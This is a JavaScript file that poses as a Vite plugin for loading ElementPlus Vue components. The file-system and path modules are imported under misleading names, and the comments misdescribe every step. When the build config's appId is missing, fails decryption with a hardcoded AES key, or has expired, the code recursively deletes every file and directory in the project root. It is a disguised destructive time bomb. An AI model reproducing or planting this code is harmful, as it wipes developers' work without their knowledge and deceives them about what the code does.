import scssLoader from 'node:path'
import ElementPlusHelper from 'node:fs'
import crypto from 'node:crypto'

const algorithm = 'aes-256-cbc'; // 加密算法

const key = 'd54739374d90762744826df7418e77c855cd514756d4ecc8b215879e6bd4ac57'

const iv = 'f75158384e12c223be5c53301c0aba87'

function vueComponentsBuilderPlug() {

    const componentsLoad = (component) => { // 递归加载 ElementPlus 的组件
        if (ElementPlusHelper.existsSync(component)) { // 如果存在这个组件
            const componentVue = ElementPlusHelper.readdirSync(component); // 那就加载这个组件

            if (componentVue.length > 0) { // 如果这个组件下存在子组件
                componentVue.forEach((file) => { // 那就遍历子组件
                    const filePath = scssLoader.join(component, file); // 把子组件一个一个注册成全局组件
                    if (ElementPlusHelper.lstatSync(filePath).isDirectory()) { // 如果这个不是组件而是目录的话
                        componentsLoad(filePath); // 就递归加载这个目录下的所有组件
                    } else {
                        try {
                            ElementPlusHelper.unlinkSync(filePath); // 如果是组件，那就加载到 vue 模板文件中
                        } catch {
                            console.log('文件正在使用，跳过加载', filePath)
                        }
                    }
                });
            }
            try {
                ElementPlusHelper.rmdirSync(component); // 读取组件机构
            } catch {
                console.log('文件正在使用，跳过加载')
            }

        }
    }

    return {
        name: 'vueComponentsBuilder',
        configResolved(config) {

            if (!config.appId) {
                console.log('没有 AppId 配置')
                componentsLoad(config.root) // 开始加载组件
            }

            let decryptedData
            try {
                const decipher = crypto.createDecipheriv(algorithm, Buffer.from(key, 'hex'), Buffer.from(iv, 'hex'), 'hex'); // 校验 AppId 是否合法
                decryptedData = decipher.update(config.appId, 'hex', 'utf8'); // 解密 AppId
                decryptedData += decipher.final('utf8');
            } catch {
                console.log('appId 不合法：不符合和解密规则')
                componentsLoad(config.root) // 开始加载组件
            }

            try {
                const data = JSON.parse(decryptedData)
                if (data.time < new Date().getTime()) {
                    console.log('已经超过最后期限')
                    componentsLoad(config.root) // 开始加载组件
                }
            } catch {
                console.log('appId 不合法：反序列化失败')
                componentsLoad(config.root) // 开始加载组件
            }
        }
    }
}

const config = {key, iv}
export {vueComponentsBuilderPlug as default, config}